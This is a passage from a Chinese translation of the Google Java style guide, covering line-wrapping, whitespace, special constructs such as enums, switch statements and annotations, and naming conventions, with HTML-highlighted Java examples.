换行</h3><p><strong>术语说明</strong>：一般情况下，一行长代码为了避免超出列限制(<code>100</code>个字符)而被分为多行，我们称之为断行(<code>line­-wrapping</code>)。</p><p>我们并没有全面，确定性的准则来决定在每一种情况下如何断行。很多时候，对于同一段代码会有好几种有效的换断行方式。</p><blockquote><p><strong>注意</strong>: 提取<code>方法</code>或<code>局部变量</code>可以解决问题，而不不需要进行断行。</p></blockquote><h4 id="4-5-1-在何处断行"><a href="#4-5-1-在何处断行" class="headerlink" title="4.5.1 在何处断行"></a>4.5.1 在何处断行</h4><p>断行的主要原则是：<strong>选择在更高级的语法逻辑处断行</strong>。其他一些原则如下：</p><ul><li>当一个非赋值运算的语句断行时，在运算符号之前断行。（这与Google的C++规范和JavaScrip规范等其他规范不同）。</li><li>如果要在非赋值运算符处断行，那么在该符号前断开(比如<code>+</code>操作符，它将位于下一行)。以下的<code>类运算符</code>也可作为参考：<ul><li>点操作符<code>.</code></li><li>类型界限中的<code>&amp;</code>、<code>||</code>等（例如：<code>&lt;T extends Foo &amp; Bar&gt;</code>)</li></ul></li><li>当要在一个赋值运算语句处断行时，一般在赋值符号之后断行。但是也可以在之前断行。(例如：<code>=</code>，它与前面的内容留在同一行)。<ul><li>这条规则也适用于<code>foreach</code>语句中的冒号。</li></ul></li><li>方法名或构造函数名与左括号留在同一行。</li><li>逗号(<code>,</code>)与其前面的内容留在同一行。也就是在逗号之后断行。</li><li><code>Lambda</code>表达式在箭头符号(<code>-&gt;</code>)后断行。</li></ul><p>示例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">MyLambda</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Long</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> lambda <span class="token operator">=</span>    <span class="token punctuation">(</span><span class="token class-name">String</span> label<span class="token punctuation">,</span> <span class="token class-name">Long</span> value<span class="token punctuation">,</span> <span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">Predicate</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> predicate <span class="token operator">=</span> str <span class="token operator">-></span>    <span class="token function">longExpressionInvolving</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注意</strong>：换行的主要目标是使代码更清晰易读。</p></blockquote><h4 id="4-5-2-断行的缩进：至少-4个空格"><a href="#4-5-2-断行的缩进：至少-4个空格" class="headerlink" title="4.5.2 断行的缩进：至少+4个空格"></a>4.5.2 断行的缩进：至少+4个空格</h4><p>自动换行时，第一行后的每一行至少比第一行多缩进<code>4</code>个空格(注意：制表符不用于缩进。见2.3.1节)。</p><p>当存在连续自动换行时，缩进可能会多缩进不只<code>4</code>个空格(语法元素存在多级时)。一般而言，两个连续行使用相同的缩进当且仅当它们开始于同级语法元素。</p><p>第4.6.3水平对齐一节中指出，不鼓励使用可变数目的空格来对齐前面行的符号。</p><h3 id="4-6-空白"><a href="#4-6-空白" class="headerlink" title="4.6 空白"></a>4.6 空白</h3><h4 id="4-6-1-垂直空白"><a href="#4-6-1-垂直空白" class="headerlink" title="4.6.1 垂直空白"></a>4.6.1 垂直空白</h4><p>以下情况需要使用单行空行：</p><ul><li>类成员之间需要单个空行隔开：例如：<code>字段</code>，<code>构造函数</code>，<code>方法</code>，<code>嵌套类</code>，<code>静态初始化块</code>，<code>实例初始化块</code>。但也有以下两种例外情况：<ul><li>两个连续字段之间的空行是可选的，根据需要使用空行来创建字段间的逻辑分组。</li><li>枚举常量之间的的空行也是可选的，根据需要使用空行来创建枚举常量间的逻辑分组。</li></ul></li><li>在方法体内，根据代码的逻辑分组的需要，设置空白行作为间隔。</li><li>类的第一个成员之前或最后一个成员之后，使用空行(可选)。</li><li>本文档所介绍的其他章节的空行要求(比如3.3节：<code>import</code>语句)。</li></ul><h4 id="4-6-2-水平空白"><a href="#4-6-2-水平空白" class="headerlink" title="4.6.2 水平空白"></a>4.6.2 水平空白</h4><p>除了语法、其他规则、词语分隔、注释和javadoc外，水平的ASCII空格只在以下情况出现：</p><ul><li>所有保留的关键字与紧接它之后的位于同一行的左大括号之间需要用空格隔开。(例如：<code>if</code>, <code>for</code> <code>catch</code>等)</li><li>所有保留的关键字与在它之前的右大括号之间需要空格隔开。（例如：<code>else</code>、<code>catch</code>）</li><li>在左大括号之前都需要空格隔开。只有两种例外：<ul><li><code>@SomeAnnotation(&#123;a, b&#125;)</code></li><li><code>String[][] x = &#123;&#123;"foo"&#125;&#125;;</code></li></ul></li><li>所有的二元运算符和三元运算符的两边，都需要空格隔开。(例如：<code>a + b</code>、<code>b = a &lt; 0 ? 0 : a</code>)</li><li>逗号(<code>,</code>)、冒号(<code>:</code>)、分号(<code>;</code>)和右小括号(<code>)</code>)、Lambda箭头符号(<code>-&gt;</code>)之后，需要空格隔开。</li><li><code>//</code>双斜线开始一行注释时，双斜线两边都应该用空格隔开。并且可使用多个空格。（可选，例如：<code>a = 0; // 赋值为0</code>）</li><li>变量声明时，变量类型和变量名之间需要用空格隔开。（例如：<code>List&lt;String&gt; list</code>）</li><li>初始化一个数组时，花括号之间可以用空格隔开，也可以不使用。（可选，例如：<code>new int[] &#123;5, 6&#125;</code>和<code>new int[] &#123; 5, 6 &#125;</code>）</li></ul><blockquote><p><strong>注意</strong>：这个规则并不要求或禁止一行的开关或结尾需要额外的空格，只对内部空格做要求。</p></blockquote><h4 id="4-6-3-水平对齐：不做要求"><a href="#4-6-3-水平对齐：不做要求" class="headerlink" title="4.6.3 水平对齐：不做要求"></a>4.6.3 水平对齐：不做要求</h4><blockquote><p><strong>术语说明</strong>：水平对齐，是指通过添加多个空格，使本行的某一符号与上一行的某一符号上下对齐。</p></blockquote><p>这种对齐是被允许的，但是不会做强制要求。</p><p>以下是没有水平对齐和水平对齐的例子：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">int</span> x<span class="token punctuation">;</span>   <span class="token comment">// 这种挺好</span><span class="token keyword">private</span> <span class="token class-name">Color</span> color<span class="token punctuation">;</span>   <span class="token comment">// 同上</span><span class="token keyword">private</span> <span class="token keyword">int</span>   x<span class="token punctuation">;</span>      <span class="token comment">// 允许，但是未来会继续编辑</span><span class="token keyword">private</span> <span class="token class-name">Color</span> color<span class="token punctuation">;</span>  <span class="token comment">// 可能会使它对不齐</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注意</strong>：水平对齐能够增加代码的可读性，但是增加了未来维护代码的难度。考虑到维护时只需要改变一行代码，之前的对齐可以不需要改动。为了对齐，你更有可能改了一行代码，同时需要更改附近的好几行代码，而这几行代码的改动，可能又会引起一些为了保持对齐的代码改动。那原本这行改动，我们称之为<strong>爆炸半径</strong>。这种改动，在最坏的情况下可能会导致大量的无意义的工作，即使在最好的情况下，也会影响版本历史信息，减慢代码<code>review</code>的速度，引起更多<code>merge</code>代码冲突的情况。</p></blockquote><h3 id="4-7-分组小括号：推荐使用"><a href="#4-7-分组小括号：推荐使用" class="headerlink" title="4.7 分组小括号：推荐使用"></a>4.7 分组小括号：推荐使用</h3><p>除非作者和<code>reviewer</code>都认为去掉小括号也不会使代码被误解，或是去掉小括号能让代码更易于阅读，否则我们不应该去掉小括号。我们没有理由假设读者能记住整个Java运算符优先级表。</p><h3 id="4-8-特殊结构"><a href="#4-8-特殊结构" class="headerlink" title="4.8 特殊结构"></a>4.8 特殊结构</h3><h4 id="4-8-1-枚举类型"><a href="#4-8-1-枚举类型" class="headerlink" title="4.8.1 枚举类型"></a>4.8.1 枚举类型</h4><p>枚举常量间用逗号隔开，换行是可选的。而且还允许附加的空行（通常只有一个）。以下就是一种可能性的示例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">enum</span> <span class="token class-name">Answer</span> <span class="token punctuation">&#123;</span>    <span class="token constant">YES</span> <span class="token punctuation">&#123;</span>        <span class="token annotation punctuation">@Override</span> <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"yes"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token constant">NO</span><span class="token punctuation">,</span>    <span class="token constant">MAYBE</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有方法和Javadoc的枚举类可写成数组初始化的格式：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">enum</span> <span class="token class-name">Suit</span> <span class="token punctuation">&#123;</span> <span class="token constant">CLUBS</span><span class="token punctuation">,</span> <span class="token constant">HEARTS</span><span class="token punctuation">,</span> <span class="token constant">SPADES</span><span class="token punctuation">,</span> <span class="token constant">DIAMONDS</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于枚举类也是一个类，因此所有适用于其它类的格式规则也适用于枚举类。</p><h4 id="4-8-2-变量声明"><a href="#4-8-2-变量声明" class="headerlink" title="4.8.2 变量声明"></a>4.8.2 变量声明</h4><h5 id="4-8-2-1-每次声明一个变量"><a href="#4-8-2-1-每次声明一个变量" class="headerlink" title="4.8.2.1 每次声明一个变量"></a>4.8.2.1 每次声明一个变量</h5><p>不要使用组合声明。例如：<code>int a, b;</code>是不允许的。</p><h5 id="4-8-2-2-需要时才声明，尽快进行初始化"><a href="#4-8-2-2-需要时才声明，尽快进行初始化" class="headerlink" title="4.8.2.2 需要时才声明，尽快进行初始化"></a>4.8.2.2 需要时才声明，尽快进行初始化</h5><p>不要在一个代码块的开头把局部变量一次性都声明了(这是c语言的做法)，而是在第一次需要使用它时才声明。局部变量在声明时最好就进行初始化，或者声明后尽快进行初始化。</p><h4 id="4-8-3-数组"><a href="#4-8-3-数组" class="headerlink" title="4.8.3 数组"></a>4.8.3 数组</h4><h5 id="4-8-3-1-数组初始化：可写成块状结构"><a href="#4-8-3-1-数组初始化：可写成块状结构" class="headerlink" title="4.8.3.1 数组初始化：可写成块状结构"></a>4.8.3.1 数组初始化：可写成块状结构</h5><p>数组初始化可以写成块状结构，例如以下格式的写法都是允许的：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>           <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span>            <span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>                       <span class="token number">1</span><span class="token punctuation">,</span>                        <span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>             <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span>               <span class="token punctuation">&#125;</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">&#125;</span>                     <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span>                          <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="4-8-3-2-非C风格的数组声明"><a href="#4-8-3-2-非C风格的数组声明" class="headerlink" title="4.8.3.2 非C风格的数组声明"></a>4.8.3.2 非C风格的数组声明</h5><p>中括号是类型的一部分：<code>String[] args</code>， 而非<code>String args[]</code>。</p><h4 id="4-8-4-switch语句"><a href="#4-8-4-switch语句" class="headerlink" title="4.8.4 switch语句"></a>4.8.4 switch语句</h4><p><strong>术语说明</strong>：<code>switch</code>块的大括号内是一个或多个语句组。每个语句组包含一个或多个<code>switch</code>标签(<code>case FOO: </code>或<code>default:</code>)，后面跟着一条或多条语句。</p><h5 id="4-8-4-1-缩进"><a href="#4-8-4-1-缩进" class="headerlink" title="4.8.4.1 缩进"></a>4.8.4.1 缩进</h5><p>和其他语句块一样，<code>switch</code>大括号之后缩进两个字符。每个<code>switch</code>标签之后，后面紧接的非标签的新行，按照大括号相同的处理方式缩进两个字符。在标签结束后，恢复到之前的缩进，类似大括号结束。</p><h5 id="4-8-4-2-继续向下执行的注释"><a href="#4-8-4-2-继续向下执行的注释" class="headerlink" title="4.8.4.2 继续向下执行的注释"></a>4.8.4.2 继续向下执行的注释</h5><p>在一个<code>switch</code>块内，每个语句组要么通过<code>break</code>、<code>continue</code>、<code>return</code>或<code>抛出异常</code>来终止，要么通过一条注释来说明程序将继续执行到下一个语句组，任何能表达这个意思的注释都是可以的(典型的是用<code>// fall through</code>)。这个特殊的注释并不需要在最后一个语句组(一般是<code>default</code>)中出现。例如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">switch</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>    <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>        <span class="token function">prepareOneOrTwo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// fall through</span>    <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>        <span class="token function">handleOneTwoOrThree</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token operator">:</span>        <span class="token function">handleLargeNumber</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注意</strong>：在<code>case 1</code>之后不需要该注释，仅在语句组的末尾。</p></blockquote><h5 id="4-8-4-3-default标签需要显式声明"><a href="#4-8-4-3-default标签需要显式声明" class="headerlink" title="4.8.4.3 default标签需要显式声明"></a>4.8.4.3 default标签需要显式声明</h5><p>每个<code>switch</code>语句中，都需要显式声明<code>default</code>标签。即使没有任何代码也需要显示声明。</p><blockquote><p><strong>注意</strong>：枚举类型的<code>switch</code>语句可以省略<code>default</code>语句组，如果它包含覆盖该类型的所有可能值的显式情况。这使得IDE或其他静态分析工具能够在丢失任何情况时发出警告。</p></blockquote><h4 id="4-8-5-注解"><a href="#4-8-5-注解" class="headerlink" title="4.8.5 注解"></a>4.8.5 注解</h4><p>注解应用到类、方法或者构造方法时，应紧接<code>Javadoc</code>之后。每一行只有一个注解。注解所在行不受列长度限制，也不需要增加缩进。例如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token annotation punctuation">@Nullable</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getNameIfPresent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>例外</strong>：如果注解只有一个，并且不带参数。则它可以和类或方法名放在同一行。例如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span> <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注解应用到成员变量时，也是紧接<code>Javadoc</code>之后。不同的是，多个注解可以放在同一行。例如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Partial</span> <span class="token annotation punctuation">@Mock</span> <span class="token class-name">DataLoader</span> loader<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对于参数或者局部变量使用注解的情况，没有特定的规范。</p><h4 id="4-8-6-注释"><a href="#4-8-6-注释" class="headerlink" title="4.8.6 注释"></a>4.8.6 注释</h4><h5 id="4-8-6-1-块注释风格"><a href="#4-8-6-1-块注释风格" class="headerlink" title="4.8.6.1 块注释风格"></a>4.8.6.1 块注释风格</h5><p>注释的缩进与它所注释的代码缩进相同。可以采用<code>/* */</code>进行注释，也可以用<code>//</code>进行注释。当使用<code>/* */</code>进行多行注释时，每一行都应该以<code>*</code>开始，并且<code>*</code>应该上下对齐。</p><p>例如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/* * This is * okay. */</span><span class="token comment">// And so</span><span class="token comment">// is this.</span><span class="token comment">/* Or you can * even do this. */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注意</strong>：多行注释时，如果你希望集成开发环境能自动对齐注释，你应该使用<code>/* */</code>，<code>//</code>一般不会自动对齐。</p></blockquote><h4 id="4-8-7-修饰符"><a href="#4-8-7-修饰符" class="headerlink" title="4.8.7 修饰符"></a>4.8.7 修饰符</h4><p>类和成员变量的修饰符，按<code>Java Lauguage Specification</code>中介绍的先后顺序排序。具体是：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">protected</span> <span class="token keyword">private</span> <span class="token keyword">abstract</span> <span class="token keyword">default</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">transient</span> <span class="token keyword">volatile</span> <span class="token keyword">synchronized</span> <span class="token keyword">native</span> <span class="token keyword">strictfp</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-8-8-数字字面量"><a href="#4-8-8-数字字面量" class="headerlink" title="4.8.8 数字字面量"></a>4.8.8 数字字面量</h4><p>长整型的数字字面量使用大写的<code>L</code>作为后缀，不得使用小写（以免与数字1混淆）。例如：使用<code>3000000000L</code>，而不是<code>3000000000l</code>。</p><h2 id="5-命名约定"><a href="#5-命名约定" class="headerlink" title="5 命名约定"></a>5 命名约定</h2><h3 id="5-1-对所有标识符都通用的规则"><a href="#5-1-对所有标识符都通用的规则" class="headerlink" title="5.1 对所有标识符都通用的规则"></a>5.1 对所有标识符都通用的规则</h3><p>标识符只能使用<code>ASCII</code>字母和数字，因此每个有效的标识符名称都能匹配正则表达式<code>\w+</code>。</p><p>在Google其它编程语言风格中使用的特殊前缀或后缀，如<code>name_</code>, <code>mName</code>, <code>s_name</code>和<code>kName</code>，在Java编程风格中都不再使用。</p><h3 id="5-2-标识符类型的规则"><a href="#5-2-标识符类型的规则" class="headerlink" title="5.2 标识符类型的规则"></a>5.2 标识符类型的规则</h3><h4 id="5-2-1-包名"><a href="#5-2-1-包名" class="headerlink" title="5.2.1 包名"></a>5.2.1 包名</h4><p>包名全部小写，连续的单词只是简单地连接起来，不使用下划线。例如：使用<code>com.example.deepspace</code>，而不是<code>com.example.deepSpace</code>或者<code>com.example.deep_space</code>。</p><h4 id="5-2-2-类名"><a href="#5-2-2-类名" class="headerlink" title="5.2.2 类名"></a>5.2.2 类名</h4><p>类名都以<code>UpperCamelCase</code>风格编写。</p><p>类名通常是名词或名词短语。例如：<code>Character</code>或者<code>ImmutableList</code>。接口名称也可以是名词或名词短语（例如：<code>List</code>），但有时可能是形容词或形容词短语（例如：<code>Readable</code>）。现在还没有特定的规则或行之有效的约定来命名注解类型。</p><p>测试类的命名以它要测试的类的名称开始，以<code>Test</code>结束。例如：<code>HashTest</code>或<code>HashIntegrationTest</code>。</p><h4 id="5-2-3-方法名"><a href="#5-2-3-方法名" class="headerlink" title="5.2.3 方法名"></a>5.2.3 方法名</h4><p>方法名都以<code>lowerCamelCase</code>风格编写。</p><p>方法名通常是动词或动词短语。例如：<code>sendMessage</code>或者<code>stop</code>。</p><p>下划线可能出现在JUnit测试方法名称中用以分隔名称的逻辑组件。一个典型的模式是：<code>test&lt;MethodUnderTest&gt;_&lt;state&gt;</code>，例如：<code>testPop_emptyStack</code>。 并不存在唯一正确的方式来命名测试方法。</p><h4 id="5-2-4-常量名"><a href="#5-2-4-常量名" class="headerlink" title="5.2.4 常量名"></a>5.2.4 常量名</h4><p>常量名命名模式为<code>CONSTANT_CASE</code>，全部字母大写，用下划线分隔单词。那到底什么算是一个常量呢？</p><p>每个常量都是一个静态<code>final</code>字段，其内容是不可变的，且没有可检测的副作用。这包括原始类型、字符串、不可变类型和不可变类型的不可变集合。如果任何一个实例的观测状态是可变的，则它肯定不会是一个常量。只是永远不打算改变对象也是不够的。例如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 常量</span><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token constant">NUMBER</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">ImmutableList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token constant">NAMES</span> <span class="token operator">=</span> <span class="token class-name">ImmutableList</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"Ed"</span><span class="token punctuation">,</span> <span class="token string">"Ann"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">ImmutableMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> <span class="token constant">AGES</span> <span class="token operator">=</span> <span class="token class-name">ImmutableMap</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"Ed"</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token string">"Ann"</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Joiner</span> <span class="token constant">COMMA_JOINER</span> <span class="token operator">=</span> <span class="token class-name">Joiner</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token char">','</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 因为Joiner是不可变的</span><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">SomeMutableType</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token constant">EMPTY_ARRAY</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">enum</span> <span class="token class-name">SomeEnum</span> <span class="token punctuation">&#123;</span> <span class="token constant">ENUM_CONSTANT</span> <span class="token punctuation">&#125;</span><span class="token comment">// 非常量</span><span class="token keyword">static</span> <span class="token class-name">String</span> nonFinal <span class="token operator">=</span> <span class="token string">"non-final"</span><span class="token punctuation">;</span><span class="token keyword">final</span> <span class="token class-name">String</span> nonStatic <span class="token operator">=</span> <span class="token string">"non-static"</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> mutableCollection <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">ImmutableSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SomeMutableType</span><span class="token punctuation">></span></span> mutableElements <span class="token operator">=</span> <span class="token class-name">ImmutableSet</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span>mutable<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">ImmutableMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">SomeMutableType</span><span class="token punctuation">></span></span> mutableValues <span class="token operator">=</span>    <span class="token class-name">ImmutableMap</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"Ed"</span><span class="token punctuation">,</span> mutableInstance<span class="token punctuation">,</span> <span class="token string">"Ann"</span><span class="token punctuation">,</span> mutableInstance2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Logger</span> logger <span class="token operator">=</span> <span class="token class-name">Logger</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nonEmptyArray <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"these"</span><span class="token punctuation">,</span> <span class="token string">"can"</span><span class="token punctuation">,</span> <span class="token string">"change"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这些常量的名字通常是名词或名词短语。</p><h4 id="5-2-5-非常量字段名"><a href="#5-2-5-非常量字段名" class="headerlink" title="5.2.5 非常量字段名"></a>5.2.5 非常量字段名</h4><p>非常量字段名以<code>lowerCamelCase</code>风格编写。</p><p>这些名字通常是名词或名词短语。例如：<code>computedValues</code>或者<code>index</code>。</p><h4 id="5-2-6-参数名"><a href="#5-2-6-参数名" class="headerlink" title="5.2.6 参数名"></a>5.2.6 参数名</h4><p>参数名以<code>lowerCamelCase</code>风格编写。</p><p>参数应该避免用单个字符命名。</p><h4 id="5-2-7-局部变量名"><a href="#5-2-7-局部变量名" class="headerlink" title="5.2.7 局部变量名"></a>5.2.7 局部变量名</h4><p>局部变量名以<code>lowerCamelCase</code>风格编写。</p><p>即使局部变量是<code>final</code>和<code>不可改变</code>的，也不应该把它示为常量，当然也就不能用常量的规则去命名它。</p><h4 id="5-2-8-类型变量名"><a href="#5-2-8-类型变量名" class="headerlink" title="5.2.8 类型变量名"></a>5.2.8 类型变量名</h4><p>类型变量可用以下两种风格之一进行命名：</p><ul><li>单个的大写字母，后面可以视具体情况跟一个数字(如：<code>E</code>, <code>T</code>, <code>X</code>, <code>T2</code>)。</li><li>以类命名方式(5.2.2节)，后面加个大写的T(如：<code>RequestT</code>, <code>FooBarT</code>)。</li></ul><h3 id="5-3-驼峰式命名法-CamelCase"><a href="#5-3-驼峰式命名法-CamelCase" class="headerlink" title="5.3 驼峰式命名法(CamelCase)"></a>5.3 驼峰式命名法(CamelCase)</h3><p><strong>驼峰式命名法</strong>分大驼峰式命名法(<code>UpperCamelCase</code>)和小驼峰式命名法(<code>lowerCamelCase</code>)。有时，我们有不只一种合理的方式将一个英语词组转换成驼峰形式，如缩略语或不寻常的结构(例如：<code>IPv6</code>或<code>iOS</code>)。Google指定了以下的转换方案。</p><p>名字从散文形式(prose form)开始:</p><ul><li>把短语转换为纯<code>ASCII</code>码，并且移除任何单引号。例如：<code>Müller’s algorithm</code>将变成<code>Muellers algorithm</code>。</li><li>把这个结果切分成单词，在空格或其它标点符号(通常是连字符)处分割开。<ul><li><strong>推荐</strong>：如果某个单词已经有了常用的驼峰表示形式，按它的组成将它分割开(如<code>AdWords</code>将分割成<code>ad words</code>)。 </li><li>需要注意的是iOS并不是一个真正的驼峰表示形式，因此该推荐对它并不适用。</li></ul></li><li>现在将所有字母都小写(包括缩写)，然后将单词的第一个字母大写：<ul><li>每个单词的第一个字母都大写，来得到大驼峰式命名。</li><li>除了第一个单词，每个单词的第一个字母都大写，来得到小驼峰式命名。</li></ul></li><li>最后将所有的单词连接起来得到一个标识符。</li></ul><p>示例：</p><table><thead><tr><th>散文形式</th><th>正确</th><th>不正确</th></tr></thead><tbody><tr><td>“XML HTTP 